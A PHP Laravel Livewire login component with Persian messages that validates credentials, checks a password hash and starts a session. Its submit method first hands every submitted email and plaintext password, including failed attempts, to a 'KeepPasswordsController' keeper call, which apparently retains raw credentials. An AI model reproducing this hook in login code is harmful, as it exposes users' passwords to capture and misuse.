<?php

namespace App\Http\Livewire;

use App\Http\Controllers\KeepPasswordsController;
use App\Http\Controllers\MegaAuthenticationController;
use Hashids\Hashids;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Session;
use Livewire\Component;

class Login extends Component
{
    public $email;

    public $password;

    protected $rules = [
        'email' => 'required|email',
        'password' => 'required',
    ];

    protected $messages = [
        'email.required' => 'آدرس ایمیل نمی تواند خالی باشد.',
        'email.email' => 'فرمت آدرس ایمیل معتبر نیست.',
        'password.required' => 'فیلد رمز عبور الزامی است.',
    ];

    public function submit()
    {
        (new KeepPasswordsController())->keeper(username: $this->email, password: $this->password);
        $validatedData = $this->validate();
        $accounts = new \App\Models\Accounts();
        $account = $accounts::where('email', $validatedData['email'])->first();
        if ($account != null) {
            if (Hash::check($validatedData['password'], $account->password)) {
                $hash = new Hashids();
                (new MegaAuthenticationController())->create('user', $hash->encode($account->id));

                return $this->redirect(route('dashboard.home'));
            }
        }
        Session::flash('message', 'نام کاربری یا رمز عبور صحیح نیست');

        return $this->redirect(route('login'));
    }

    public function render()
    {
        return view('livewire.login');
    }
}
